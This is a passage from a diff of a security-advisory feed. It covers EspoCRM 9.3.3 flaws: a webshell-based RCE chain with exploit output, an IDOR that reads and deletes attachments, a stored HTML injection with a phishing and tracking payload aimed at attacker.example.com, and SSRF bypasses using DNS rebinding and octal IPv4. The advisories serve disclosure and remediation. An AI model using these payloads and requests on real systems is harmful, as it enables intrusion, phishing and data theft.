+2. Use `POST /api/v1/Formula/action/run` with `record\update("Attachment", "&lt;id&gt;", "sourceId", "../../client/&lt;shell&gt;")` to overwrite `sourceId` with a path-traversal string pointing to the web root.&#13;
+3. Upload the PHP webshell via `POST /api/v1/Attachment/chunk/&lt;id&gt;` with `Content-Type: application/octet-stream` and body `data:application/octet-stream;base64,&lt;base64_payload&gt;`. The write lands at `client/&lt;shell&gt;` — inside the Apache document root — but Apache won't execute it without a PHP handler directive.&#13;
+4. Repeat steps 1–3 for a second attachment, redirecting `sourceId` to `../../.htaccess`, and appending a `FilesMatch` directive that registers the specific shell filename as a PHP handler.&#13;
+5. `GET /client/&lt;shell&gt;?c=id` =&gt; `uid=33(www-data) gid=33(www-data)`.&#13;
+&#13;
+### PoC&#13;
+See attached PoC script. The full chain completes in six HTTP requests against a default EspoCRM v9.3.3 installation on Apache/PHP (Debian). No non-default configuration is required.&#13;
+[espo_pwn.sh](https://github.com/user-attachments/files/26159046/espo_pwn.sh)&#13;
+&#13;
+Here is the output of a successful exploitation attempt:&#13;
+```&#13;
+[*] Target : http://192.168.5.16:8090&#13;
+[*] User   : admin&#13;
+&#13;
+[1/6] Creating webshell attachment...&#13;
+    Attachment ID: 69be311e8c131f1b7&#13;
+[2/6] Setting sourceId via formula ...&#13;
+    sourceId → ../../client/x&#13;
+[3/6] Writing PHP webshell to client/x...&#13;
+    Response: true&#13;
+[4/6] Creating .htaccess attachment...&#13;
+    Attachment ID: 69be311f5c29e493e&#13;
+[5/6] Redirecting to .htaccess via formula...&#13;
+    sourceId → ../../.htaccess&#13;
+[6/6] Appending PHP handler directive to .htaccess...&#13;
+    Response: true&#13;
+&#13;
+[*] Executing: id&#13;
+    Webshell: http://192.168.5.16:8090/client/x?c=&lt;cmd&gt;&#13;
+&#13;
+uid=33(www-data) gid=33(www-data) groups=33(www-data)&#13;
+&#13;
+[+] RCE CONFIRMED&#13;
+```&#13;
+&#13;
+### Impact&#13;
+Authenticated Remote Code Execution (OS-level command execution)&#13;
+&#13;
+### Attribution&#13;
+Discovered by: Jiva (JivaSecurity)</description>
+      <guid isPermaLink="false">GHSA-7922-x7cf-j54x</guid>
+      <pubDate>Wed, 22 Apr 2026 17:06:57 +0000</pubDate>
+    </item>
+    <item>
       <title>[HIGH] composer/composer – Command injection via malicious Perforce repository definition</title>
       <link>https://github.com/composer/composer/security/advisories/GHSA-wg36-wvj6-r67p</link>
       <description>### Impact&#13;
@@ -4721,6 +5312,708 @@ Note, the fix for the source url in the `Perforce::generateP4Command()` was addr
 - Only use trusted Composer repositories.</description>
       <guid isPermaLink="false">GHSA-gqw4-4w2p-838q</guid>
       <pubDate>Tue, 14 Apr 2026 09:46:31 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm – Email importEml can import and delete another user's attachment by raw fileId</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-wr7j-hxf8-hc4w</link>
+      <description>## Summary&#13;
+The `POST /api/v1/Email/importEml` endpoint accepts an attacker-controlled `fileId` and imports the referenced attachment as an email without checking whether the current user is allowed to access that attachment. This lets a low-privileged attacker who only has `Email:create` and `Import` permissions read another user's `.eml` attachment and, as part of the same flow, delete the victim's original attachment record.&#13;
+&#13;
+## Details&#13;
+The relevant routes are:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Resources/routes.json#L319-L321](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Resources/routes.json#L319-L321)&#13;
+&#13;
+[application/Espo/Resources/routes.json#L369-L371](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Resources/routes.json#L369-L371)&#13;
+&#13;
+`PostImportEml` takes raw `fileId` input from the request body, checks only `Email:create` and `Import` scope access, and passes the ID into `ImportEmlService`:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Tools/Email/Api/PostImportEml.php#L54-L80](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Tools/Email/Api/PostImportEml.php#L54-L80)&#13;
+&#13;
+```php&#13;
+public function process(Request $request): Response&#13;
+{&#13;
+    $this-&gt;checkAccess();&#13;
+&#13;
+    $fileId = $request-&gt;getParsedBody()-&gt;fileId ?? null;&#13;
+&#13;
+    if (!is_string($fileId)) {&#13;
+        throw new BadRequest("No 'fileId'.");&#13;
+    }&#13;
+&#13;
+    $email = $this-&gt;service-&gt;import($fileId, $this-&gt;user-&gt;getId());&#13;
+&#13;
+    return ResponseComposer::json(['id' =&gt; $email-&gt;getId()]);&#13;
+}&#13;
+&#13;
+private function checkAccess(): void&#13;
+{&#13;
+    if (!$this-&gt;acl-&gt;checkScope(Email::ENTITY_TYPE, Acl\Table::ACTION_CREATE)) {&#13;
+        throw new Forbidden("No 'create' access.");&#13;
+    }&#13;
+&#13;
+    if (!$this-&gt;acl-&gt;checkScope('Import')) {&#13;
+        throw new Forbidden("No access to 'Import'.");&#13;
+    }&#13;
+}&#13;
+```&#13;
+&#13;
+`ImportEmlService` then fetches the attachment by ID directly from the repository, reads its contents from storage, imports it into the attacker's mailbox, and finally deletes the original attachment record:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Tools/Email/ImportEmlService.php#L66-L107](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Tools/Email/ImportEmlService.php#L66-L107)&#13;
+&#13;
+```php&#13;
+public function import(string $fileId, ?string $userId = null): Email&#13;
+{&#13;
+    $attachment = $this-&gt;getAttachment($fileId);&#13;
+    $contents = $this-&gt;fileStorageManager-&gt;getContents($attachment);&#13;
+&#13;
+    $message = new MessageWrapper(1, null, $this-&gt;parser, $contents);&#13;
+&#13;
+    $this-&gt;checkDuplicate($message);&#13;
+&#13;
+    $email = $this-&gt;importer-&gt;import($message, Data::create());&#13;
+&#13;
+    if ($userId) {&#13;
+        $this-&gt;entityManager-&gt;getRDBRepositoryByClass(Email::class)&#13;
+            -&gt;getRelation($email, 'users')&#13;
+            -&gt;relateById($userId);&#13;
+    }&#13;
+&#13;
+    $this-&gt;entityManager-&gt;removeEntity($attachment);&#13;
+&#13;
+    return $email;&#13;
+}&#13;
+&#13;
+private function getAttachment(string $fileId): Attachment&#13;
+{&#13;
+    $attachment = $this-&gt;entityManager-&gt;getRDBRepositoryByClass(Attachment::class)-&gt;getById($fileId);&#13;
+&#13;
+    if (!$attachment) {&#13;
+        throw new NotFound("Attachment not found.");&#13;
+    }&#13;
+&#13;
+    return $attachment;&#13;
+}&#13;
+```&#13;
+&#13;
+This is inconsistent with the normal download path. The regular file download flow loads the attachment through the record service and enforces ACL checks before returning the file:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Tools/Attachment/Service.php#L62-L78](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Tools/Attachment/Service.php#L62-L78)&#13;
+&#13;
+[application/Espo/EntryPoints/Download.php#L55-L69](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/EntryPoints/Download.php#L55-L69)&#13;
+&#13;
+```php&#13;
+public function getFileData(string $id): FileData&#13;
+{&#13;
+    $attachment = $this-&gt;recordServiceContainer&#13;
+        -&gt;get(Attachment::ENTITY_TYPE)&#13;
+        -&gt;getEntity($id);&#13;
+&#13;
+    if (!$attachment) {&#13;
+        throw new NotFound();&#13;
+    }&#13;
+&#13;
+    return new FileData(&#13;
+        $attachment-&gt;getName(),&#13;
+        $attachment-&gt;getType(),&#13;
+        $this-&gt;getAttachmentRepository()-&gt;getStream($attachment),&#13;
+        $this-&gt;getAttachmentRepository()-&gt;getSize($attachment)&#13;
+    );&#13;
+}&#13;
+&#13;
+if (!$this-&gt;acl-&gt;checkEntity($attachment)) {&#13;
+    throw new Forbidden("No access to attachment.");&#13;
+}&#13;
+```&#13;
+&#13;
+So the data flow is:&#13;
+- Attacker supplies `fileId` in `POST /api/v1/Email/importEml`.&#13;
+- `PostImportEml` checks only `Email:create` and `Import`.&#13;
+- `ImportEmlService::getAttachment()` performs a raw repository lookup by user-controlled ID.&#13;
+- `fileStorageManager-&gt;getContents()` reads the victim attachment from storage.&#13;
+- `importer-&gt;import()` creates a new email for the attacker containing the victim attachment contents.&#13;
+- `removeEntity($attachment)` deletes the victim attachment record.&#13;
+&#13;
+If the attacker knows an attachment ID, the endpoint becomes a read-plus-delete IDOR against `.eml` attachments owned by other users. Attachment IDs are not purely secret in practice; they are commonly exposed in normal UI/API flows such as stream attachment payloads and download links.&#13;
+&#13;
+For example, note/stream data populates attachment IDs into the serialized entity:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Entities/Note.php#L155-L196](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Entities/Note.php#L155-L196)&#13;
+&#13;
+## PoC&#13;
+The issue was reproduced on tag `9.3.3` on the Docker lab instance using two low-privileged users:&#13;
+- `victim`: can upload note/stream attachments.&#13;
+- `attacker`: has `Email:create = yes` and `Import = true`, but `Attachment.read = own`.&#13;
+&#13;
+The uploaded file must be a valid EML. The following sample was used successfully:&#13;
+&#13;
+```eml&#13;
+From: victim@example.com&#13;
+To: attacker@example.com&#13;
+Subject: importEml poc&#13;
+Date: Mon, 23 Mar 2026 19:00:00 +0000&#13;
+Message-ID: &lt;importeml-poc@example.com&gt;&#13;
+MIME-Version: 1.0&#13;
+Content-Type: text/plain; charset=UTF-8&#13;
+&#13;
+Body importEml poc&#13;
+```&#13;
+&#13;
+1. Log in as the victim and upload the `.eml` file through a normal stream attachment flow. This creates an attachment record and reveals its `attachmentId` in the browser/Burp traffic.&#13;
+&#13;
+Evidence:&#13;
+&lt;img width="527" height="394" alt="create_attach_file" src="https://github.com/user-attachments/assets/98227839-210f-4d8a-a518-999fe81570d6" /&gt;&#13;
+&lt;img width="824" height="468" alt="verify_attach_file" src="https://github.com/user-attachments/assets/e38a71b3-407b-4faa-a923-87e47b4f82ea" /&gt;&#13;
+&#13;
+2. Log in as the attacker and request the victim attachment through the standard file endpoint:&#13;
+&#13;
+```http&#13;
+GET /api/v1/Attachment/file/&lt;ATTACHMENT_ID&gt; HTTP/1.1&#13;
+Host: 127.0.0.1:8080&#13;
+```&#13;
+&#13;
+Observed result: `403 Forbidden`.&#13;
+&#13;
+Evidence:&#13;
+&#13;
+![Attacker requests the victim attachment by ID](./attacker_403_attach_id.png)&#13;
+&#13;
+&#13;
+![The standard attachment endpoint returns 403](./attacker_403_attach_id_response.png)&#13;
+&#13;
+&#13;
+3. Still as the attacker, send the vulnerable import request with the same raw `fileId`:&#13;
+&#13;
+```http&#13;
+POST /api/v1/Email/importEml HTTP/1.1&#13;
+Host: 127.0.0.1:8080&#13;
+Content-Type: application/json&#13;
+&#13;
+{"fileId":"&lt;ATTACHMENT_ID&gt;"}&#13;
+```&#13;
+&#13;
+Observed result:&#13;
+&#13;
+```json&#13;
+{"id":"&lt;EMAIL_ID&gt;"}&#13;
+```&#13;
+&#13;
+Evidence:&#13;
+&lt;img width="833" height="561" alt="import_eml" src="https://github.com/user-attachments/assets/6dba0f25-4048-425a-9013-4b9f483fe958" /&gt;&#13;
+&#13;
+&#13;
+&lt;img width="685" height="386" alt="import_eml_response" src="https://github.com/user-attachments/assets/77d82635-b29b-4e33-8d14-a55ba0e031e2" /&gt;&#13;
+&#13;
+4. Fetch the newly created email record as the attacker:&#13;
+&#13;
+```http&#13;
+GET /api/v1/Email/&lt;EMAIL_ID&gt; HTTP/1.1&#13;
+Host: 127.0.0.1:8080&#13;
+```&#13;
+&#13;
+Observed result: the attacker receives an email created from the victim's attachment contents, including the victim-controlled `Subject`, `From`, `To`, and body data.&#13;
+&#13;
+Evidence:&#13;
+&#13;
+&lt;img width="826" height="457" alt="get_mail" src="https://github.com/user-attachments/assets/1500e951-19af-4c42-a66d-0efd342bab1b" /&gt;&#13;
+&#13;
+&lt;img width="487" height="902" alt="get_mail_response" src="https://github.com/user-attachments/assets/9b89bfc5-13de-46a2-8858-f1297a8195f7" /&gt;&#13;
+&#13;
+5. Verify that the original attachment was deleted as a side effect of the import:&#13;
+&#13;
+Evidence:&#13;
+&#13;
+&lt;img width="1061" height="318" alt="file_deleted" src="https://github.com/user-attachments/assets/85c6cd3e-f7f4-4130-afc5-2ee70cec2626" /&gt;&#13;
+&#13;
+&lt;img width="547" height="284" alt="verify_attach_file_404" src="https://github.com/user-attachments/assets/400fd9a1-c713-4dc8-a967-f0646a5e25c2" /&gt;&#13;
+&#13;
+&#13;
+This proves the full exploit chain:&#13;
+- the attacker cannot directly download the victim attachment;&#13;
+- the attacker can still read it by importing it as email via raw `fileId`;&#13;
+- the original attachment is deleted after successful import.&#13;
+&#13;
+## Impact&#13;
+This is a cross-user IDOR caused by using a user-controlled attachment ID without enforcing attachment-level authorization.&#13;
+&#13;
+Any authenticated user who has:&#13;
+- `Email:create`&#13;
+- `Import`&#13;
+&#13;
+can exploit it against another user's `.eml` attachment if they know or can obtain its attachment ID.&#13;
+&#13;
+Impact:&#13;
+- Unauthorized read of another user's email attachment contents.&#13;
+- Unauthorized import of that content into the attacker's mailbox.&#13;
+- Destructive side effect: deletion of the victim's original attachment record.&#13;
+&#13;
+This is especially problematic because attachment IDs are often exposed in ordinary UI/API workflows, so the exploit precondition is realistic in multi-user deployments.&#13;
+&#13;
+## Remediation&#13;
+The import flow must enforce authorization on the referenced attachment before reading it.&#13;
+&#13;
+Recommended fixes:&#13;
+- Replace the raw repository lookup in `ImportEmlService::getAttachment()` with the same ACL-aware record service used by the normal attachment download flow.&#13;
+- Explicitly verify that the current user can read the attachment before calling `fileStorageManager-&gt;getContents()`.&#13;
+- Do not delete the original attachment automatically unless the caller also has permission to modify or delete that attachment.&#13;
+- Add authorization tests covering cross-user `fileId` inputs for `POST /api/v1/Email/importEml`.&#13;
+&#13;
+---</description>
+      <guid isPermaLink="false">GHSA-wr7j-hxf8-hc4w</guid>
+      <pubDate>Mon, 13 Apr 2026 10:36:22 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm – Stored HTML injection in email notifications about stream notes via Markdown allowing HTML markup</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-8prm-r5j9-j574</link>
+      <description>### Summary&#13;
+A stored HTML injection vulnerability in EspoCRM allows authenticated users with standard (non-administrative) privileges to inject arbitrary HTML into system-generated email notifications. The issue occurs because the `post` field in stream activity notifications is rendered using unescaped Handlebars triple-brace syntax (`{{{post}}}`), enabling attackers to deliver phishing content and tracking payloads via trusted system emails.&#13;
+&#13;
+---&#13;
+&#13;
+### Details&#13;
+EspoCRM uses server-side Handlebars templates to generate email notifications for stream activities (`notePost`, `notePostNoParent`, `mention`). These templates render the `post` field using triple braces:&#13;
+&#13;
+```handlebars&#13;
+&#13;
+&#13;
+This results in raw HTML output without escaping.&#13;
+&#13;
+The `post` value is processed using `Michelf\Markdown::defaultTransform()`, which allows inline HTML by default:&#13;
+&#13;
+```php&#13;
+public $no_markup = false;&#13;
+```&#13;
+&#13;
+As a result, attacker-controlled HTML is preserved during Markdown transformation.&#13;
+&#13;
+The processed value is then passed as `additionalData` to the Htmlizer:&#13;
+&#13;
+```php&#13;
+$data['post'] = $post;&#13;
+```&#13;
+&#13;
+During rendering, the Htmlizer explicitly skips attributes present in `additionalData`:&#13;
+&#13;
+```php&#13;
+if ($additionalData &amp;&amp; array_key_exists($attribute, $additionalData)) { &#13;
+continue;&#13;
+}&#13;
+```&#13;
+&#13;
+This means the `post` field is never passed through any formatting or sanitization step.&#13;
+&#13;
+Additionally, the original `post` content is stored without sanitization:&#13;
+&#13;
+```php&#13;
+public function handlePostText(Note $entity): void&#13;
+{ &#13;
+$post = $entity-&gt;getPost(); &#13;
+$post = preg_replace($regexp, '\1[\3/\4](#\3/view/\4)', $post); &#13;
+$entity-&gt;setPost($post);&#13;
+}&#13;
+```&#13;
+&#13;
+This creates a pipeline where user-controlled HTML is accepted, preserved, and rendered directly into email templates without escaping.&#13;
+&#13;
+---&#13;
+&#13;
+### PoC&#13;
+&#13;
+The issue was reproduced using a **non-administrative user account with default "User" role permissions**. No elevated privileges are required.&#13;
+&#13;
+1. Authenticate as a regular user (e.g., `testuser`).&#13;
+&#13;
+2. Send the following request:&#13;
+&#13;
+```bash&#13;
+curl -X POST "http://localhost:8080/api/v1/Note" \ &#13;
+-H "Authorization: Basic $(echo -n 'testuser:Test1234!' | base64)" \ &#13;
+-H "Content-Type: application/json" \ &#13;
+-d '{ &#13;
+"post": "&lt;img src=\"http://attacker.example.com/track.gif\" width=\"1\" height=\"1\"&gt;&lt;div style=\"background:#cc0000;padding:20px;color:white;font-family:Arial\"&gt;&lt;b&gt;⚠️ EspoCRM Security Notice:&lt;/b&gt; Re-auth required &lt;a href=\"http://attacker.example.com/login\" style=\"color:yellow\"&gt;Click here&lt;/a&gt;&lt;/div&gt;", &#13;
+"parentType": "Contact", &#13;
+"parentId": "&lt;valid_id&gt;", &#13;
+"type": "Post" &#13;
+}'&#13;
+```&#13;
+&#13;
+3. Please note that:&#13;
+&#13;
+* The request succeeds (HTTP 200)&#13;
+* An email notification is automatically sent&#13;
+* The email body contains the injected HTML without escaping&#13;
+* External resources (e.g., tracking pixel) are requested when the email is opened&#13;
+&#13;
+4. The resulting email contains content such as:&#13;
+&#13;
+```html&#13;
+&lt;p&gt;Test User posted on contact...&lt;/p&gt;&#13;
+&lt;p&gt;&lt;img src="http://attacker.example.com/track.gif"&gt;...&lt;/p&gt;&#13;
+```&#13;
+&#13;
+A raw email sample (`.eml`) demonstrating the injected HTML&#13;
+&lt;img width="630" height="566" alt="html injection 3" src="https://github.com/user-attachments/assets/320626e2-19ea-4099-9b58-050ee7528bf8" /&gt;&#13;
+&#13;
+&#13;
+---&#13;
+&#13;
+###Impact&#13;
+&#13;
+This vulnerability allows any authenticated user to inject arbitrary HTML into trusted system-generated emails.&#13;
+&#13;
+Impacts include:&#13;
+&#13;
+* Phishing attacks using legitimate system email context&#13;
+* Injection of attacker-controlled links&#13;
+* User tracking via embedded resources (e.g., image beacons)&#13;
+* UI manipulation within email content&#13;
+&#13;
+Emails are sent using the system’s configured SMTP identity (e.g., administrative sender), making the malicious content appear fully trusted to recipients.&#13;
+&#13;
+The @mention feature enables targeted delivery to specific users, increasing the effectiveness of phishing attacks.&#13;
+&#13;
+No elevated privileges are required to exploit this issue.&#13;
+&#13;
+&lt;img width="648" height="340" alt="html injection" src="https://github.com/user-attachments/assets/d04a34bc-bb79-4da3-9487-7170c30ebf17" /&gt;&#13;
+&#13;
+</description>
+      <guid isPermaLink="false">GHSA-8prm-r5j9-j574</guid>
+      <pubDate>Mon, 13 Apr 2026 10:34:29 +0000</pubDate>
+    </item>
+    <item>
+      <title>[LOW] espocrm/espocrm – SSRF via DNS Rebinding in Attachment fromImageUrl Endpoint Allows Internal Network Access</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-6m4j-fwrx-crh7</link>
+      <description>## Summary&#13;
+&#13;
+The `POST /api/v1/Attachment/fromImageUrl` endpoint is vulnerable to SSRF&#13;
+via a DNS resolution inconsistency. Host validation uses `dns_get_record()`&#13;
+while the actual HTTP request uses curl's internal resolver (`gethostbyname()`),&#13;
+creating a time-of-check vs time-of-use (TOCTOU) condition. An attacker can&#13;
+exploit this gap to bypass internal IP restrictions and reach internal network&#13;
+services that are not externally accessible.&#13;
+&#13;
+## Details&#13;
+&#13;
+The vulnerability exists in `HostCheck::isNotInternalHost()`:&#13;
+&#13;
+**`application/Espo/Core/Utils/Security/HostCheck.php`**&#13;
+```php&#13;
+public function isNotInternalHost(string $host): bool&#13;
+{&#13;
+    $records = dns_get_record($host, DNS_A); // real DNS only, ignores /etc/hosts&#13;
+&#13;
+    if (filter_var($host, FILTER_VALIDATE_IP)) {&#13;
+        return $this-&gt;ipAddressIsNotInternal($host);&#13;
+    }&#13;
+&#13;
+    if (!$records) {&#13;
+        return true; // secondary issue: empty DNS result implicitly allows the host&#13;
+    }&#13;
+&#13;
+    foreach ($records as $record) {&#13;
+        $idAddress = $record['ip'] ?? null;&#13;
+        if (!$idAddress) return false;&#13;
+        if (!$this-&gt;ipAddressIsNotInternal($idAddress)) return false;&#13;
+    }&#13;
+&#13;
+    return true;&#13;
+}&#13;
+```&#13;
+&#13;
+**Two issues identified:**&#13;
+&#13;
+**Issue 1 - TOCTOU via DNS rebinding:**&#13;
+`dns_get_record()` queries the DNS resolver directly and ignores local&#13;
+resolution sources such as `/etc/hosts`. curl resolves hostnames via&#13;
+`gethostbyname()`, which reads `/etc/hosts` first before querying DNS.&#13;
+This means the two lookups can return different IP addresses for the&#13;
+same hostname  a classic DNS rebinding condition. The validation&#13;
+happens against one IP while the connection is made to another.&#13;
+&#13;
+**Issue 2 - Empty DNS result bypasses check:**&#13;
+If `dns_get_record()` returns no A records (DNS failure, IPv6-only&#13;
+domain, or non-existent hostname), the function returns `true` without&#13;
+further validation, implicitly allowing the host. This may enable&#13;
+additional bypasses using malformed or IPv6-only domains.&#13;
+&#13;
+**`application/Espo/Tools/Attachment/UploadUrlService.php`**&#13;
+&#13;
+The check happens entirely before the curl request with no post-connect&#13;
+validation:&#13;
+```php&#13;
+if (!$this-&gt;urlCheck-&gt;isNotInternalUrl($url)) {&#13;
+    throw new ForbiddenSilent("Not allowed URL.");&#13;
+}&#13;
+$response = curl_exec($ch); // no secondary IP check after connection&#13;
+```&#13;
+&#13;
+## PoC&#13;
+&#13;
+**Environment:** EspoCRM Docker instance, any authenticated user account&#13;
+with attachment access (default configuration).&#13;
+&#13;
+**Required:** A domain whose DNS resolves to a public IP (passes&#13;
+`HostCheck`), with the ability to control how the server resolves&#13;
+it at connection time.&#13;
+&#13;
+**Steps to reproduce:**&#13;
+&#13;
+1. Register a domain (e.g. `attacker.com`) with TTL=0, initially&#13;
+   pointing to a public IP address to pass the `HostCheck` validation.&#13;
+&#13;
+2. Send the following request:&#13;
+```http&#13;
+POST /api/v1/Attachment/fromImageUrl HTTP/1.1&#13;
+Host: target.espocrm.com&#13;
+Authorization: Basic &lt;base64(user:pass)&gt;&#13;
+Content-Type: application/json&#13;
+&#13;
+{&#13;
+  "url": "http://attacker.com:3306/image.jpg",&#13;
+  "field": "attachments",&#13;
+  "parentType": "KnowledgeBaseArticle"&#13;
+}&#13;
+```&#13;
+&#13;
+3. After `HostCheck` resolves the domain to the public IP (passes),&#13;
+   flip the DNS record to point to an internal IP (e.g. `192.168.1.1`).&#13;
+   With TTL=0, the next resolution by curl returns the internal IP.&#13;
+&#13;
+4. The server connects to the internal host. Response confirms bypass:&#13;
+   - `403 Forbidden`  check blocked the request (expected for direct IPs)&#13;
+   - `500 Internal Server Error` + `X-Status-Reason: Bad image data`&#13;
+     curl reached the internal host (bypass confirmed)&#13;
+&#13;
+**Test results:**&#13;
+&#13;
+| Target | Response | Result |&#13;
+|---|---|---|&#13;
+| `http://172.20.0.2:3306` (direct IP) | `403` | Correctly blocked |&#13;
+| `http://attacker.com:3306` (rebind → `172.20.0.2`) | `500 Bad image data` | **Bypassed** |&#13;
+| `http://attacker.com:80` | `500 Bad image data` | **Bypassed** |&#13;
+| `http://attacker.com:22` | `500 Bad image data` | **Bypassed** |&#13;
+&#13;
+In the test environment the DNS rebinding condition was reproduced by&#13;
+modifying `/etc/hosts` inside the container, which demonstrates the&#13;
+same resolution inconsistency without relying on precise timing.&#13;
+&#13;
+## Impact&#13;
+&#13;
+**Type:** Server-Side Request Forgery (SSRF) via DNS Rebinding (TOCTOU)&#13;
+&#13;
+**Who is affected:** Any EspoCRM installation where authenticated users&#13;
+have attachment creation access, which is the default configuration.&#13;
+&#13;
+**What an attacker can do:**&#13;
+- Scan internal network ports and map running services&#13;
+- Confirm existence of internal hosts not accessible externally&#13;
+- Interact with internal HTTP-based services, which may expose&#13;
+  sensitive information or provide a pivot point for further&#13;
+  attacks within the internal network&#13;
+&#13;
+**What is not possible via this endpoint:**&#13;
+- Data extraction from binary protocol services such as MySQL&#13;
+  the endpoint expects image data and discards non-image responses&#13;
+- Remote code execution&#13;
+&#13;
+**Suggested fix:**&#13;
+&#13;
+The only reliable mitigation for DNS rebinding is to validate the&#13;
+actual IP address after the connection is established, not before:&#13;
+```php&#13;
+$response = curl_exec($ch);&#13;
+&#13;
+$primaryIp = curl_getinfo($ch, CURLINFO_PRIMARY_IP);&#13;
+&#13;
+if (!filter_var($primaryIp, FILTER_VALIDATE_IP,&#13;
+    FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {&#13;
+    curl_close($ch);&#13;
+    return null;&#13;
+}&#13;
+```&#13;
+&#13;
+This eliminates the TOCTOU window entirely because validation&#13;
+happens after the TCP connection is made, regardless of what&#13;
+DNS returned beforehand.</description>
+      <guid isPermaLink="false">GHSA-6m4j-fwrx-crh7</guid>
+      <pubDate>Mon, 13 Apr 2026 10:31:12 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm – Authenticated SSRF via internal-host validation bypass using alternative IPv4 notation</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-h7gx-8gwv-7g73</link>
+      <description>````md&#13;
+### Summary&#13;
+&#13;
+An authenticated SSRF vulnerability exists in EspoCRM due to a bypass in the internal-host validation logic. By using an alternative IPv4 representation such as `0177.0.0.1` instead of `127.0.0.1`, an authenticated user can bypass the protection intended to block loopback and other internal addresses. In the confirmed `/api/v1/Attachment/fromImageUrl` flow, this allows the server to make requests to loopback-only services and create an attachment from the fetched response.&#13;
+&#13;
+---&#13;
+&#13;
+### Details&#13;
+&#13;
+The issue affects the internal-host validation used to prevent requests to internal destinations.&#13;
+&#13;
+Confirmed affected flow:&#13;
+&#13;
+- `POST /api/v1/Attachment/fromImageUrl`&#13;
+&#13;
+Relevant code in `application/Espo/Core/Utils/Security/HostCheck.php`:&#13;
+&#13;
+```php&#13;
+public function isNotInternalHost(string $host): bool&#13;
+{&#13;
+    $records = dns_get_record($host, DNS_A);&#13;
+&#13;
+    if (filter_var($host, FILTER_VALIDATE_IP)) {&#13;
+        return $this-&gt;ipAddressIsNotInternal($host);&#13;
+    }&#13;
+&#13;
+    if (!$records) {&#13;
+        return true;&#13;
+    }&#13;
+&#13;
+    foreach ($records as $record) {&#13;
+        $idAddress = $record['ip'] ?? null;&#13;
+        if (!$idAddress) return false;&#13;
+        if (!$this-&gt;ipAddressIsNotInternal($idAddress)) return false;&#13;
+    }&#13;
+&#13;
+    return true;&#13;
+}&#13;
+````&#13;
+&#13;
+Root cause:&#13;
+&#13;
+* `HostCheck::isNotInternalHost()` only handles the input as an IP address when `filter_var($host, FILTER_VALIDATE_IP)` succeeds.&#13;
+* Alternative IPv4 forms such as `0177.0.0.1` are not accepted by `filter_var(..., FILTER_VALIDATE_IP)`.&#13;
+* The code then falls back to `dns_get_record()`.&#13;
+* If no DNS records are returned, the function returns `true`, treating the host as safe.&#13;
+* cURL then normalizes the alternative IPv4 form and connects to the loopback destination.&#13;
+&#13;
+Confirmed behavior from testing:&#13;
+&#13;
+* `http://127.0.0.1:9002/interno.png` is blocked with `HTTP 403`.&#13;
+* `http://0177.0.0.1:9002/interno.png` succeeds with `HTTP 200`.&#13;
+* The application creates an attachment from the fetched response.&#13;
+* A loopback listener logs `GET /interno.png`, confirming that the server made the internal request.&#13;
+&#13;
+This appears distinct from CVE-2023-46736, which involved redirect-based SSRF behavior. This report concerns a bypass of the current internal-host validation through alternative IPv4 representations.&#13;
+&#13;
+---&#13;
+&#13;
+### PoC&#13;
+&#13;
+Tested on EspoCRM `9.3.3`.&#13;
+&#13;
+#### 1. Start a loopback-only HTTP listener on `127.0.0.1:9002`&#13;
+&#13;
+Create a valid PNG file and start a local listener:&#13;
+&#13;
+```bash&#13;
+mkdir -p /tmp/ssrf-lab&#13;
+php -r '$d=base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9Wn0K6sAAAAASUVORK5CYII="); file_put_contents("/tmp/ssrf-lab/interno.png",$d);'&#13;
+cd /tmp/ssrf-lab&#13;
+php -S 127.0.0.1:9002&#13;
+```&#13;
+&#13;
+#### 2. Verify that direct loopback access is blocked&#13;
+&#13;
+```http&#13;
+POST /api/v1/Attachment/fromImageUrl HTTP/1.1&#13;
+Host: 127.0.0.1:8080&#13;
+Authorization: Basic &lt;redacted&gt;&#13;
+Espo-Authorization: &lt;redacted&gt;&#13;
+Espo-Authorization-By-Token: true&#13;
+Cookie: auth-token-secret=&lt;redacted&gt;; auth-token=&lt;redacted&gt;&#13;
+Content-Type: application/json&#13;
+Accept: */*&#13;
+Referer: http://127.0.0.1:8080/&#13;
+Connection: close&#13;
+&#13;
+{"url":"http://127.0.0.1:9002/interno.png","field":"avatar","parentType":"User"}&#13;
+```&#13;
+&#13;
+Expected result:&#13;
+&#13;
+* `HTTP 403 Forbidden`&#13;
+&#13;
+&#13;
+&lt;img width="1063" height="486" alt="5" src="https://github.com/user-attachments/assets/0406f411-5ce6-4a38-a3b3-ae76013291fc" /&gt;&#13;
+&#13;
+&#13;
+#### 3. Bypass the restriction with octal notation&#13;
+&#13;
+```http&#13;
+POST /api/v1/Attachment/fromImageUrl HTTP/1.1&#13;
+Host: 127.0.0.1:8080&#13;
+Authorization: Basic &lt;redacted&gt;&#13;
+Espo-Authorization: &lt;redacted&gt;&#13;
+Espo-Authorization-By-Token: true&#13;
+Cookie: auth-token-secret=&lt;redacted&gt;; auth-token=&lt;redacted&gt;&#13;
+Content-Type: application/json&#13;
+Accept: */*&#13;
+Referer: http://127.0.0.1:8080/&#13;
+Connection: close&#13;
+&#13;
+{"url":"http://0177.0.0.1:9002/interno.png","field":"avatar","parentType":"User"}&#13;
+```&#13;
+&#13;
+Observed result:&#13;
+&#13;
